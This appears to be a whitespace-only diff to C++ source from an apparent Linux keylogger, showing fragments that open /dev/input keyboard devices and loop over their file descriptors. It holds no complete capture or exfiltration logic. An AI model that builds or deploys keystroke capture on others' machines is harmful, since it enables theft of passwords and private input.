@@ -120,7 +120,7 @@ std::vector<int> get_keyboard_fds() {
     int fd = open(std::string("/dev/input/" + event).c_str(), O_RDONLY);
  
     fds.emplace_back(fd);
- }
+  }
 
   return fds;
 }
@@ -246,7 +246,6 @@ int run(struct keylogger_ctx *ctx) {
         }
       }
     }
-
   }
 
   for (auto &fd : ctx->kb_fds) {
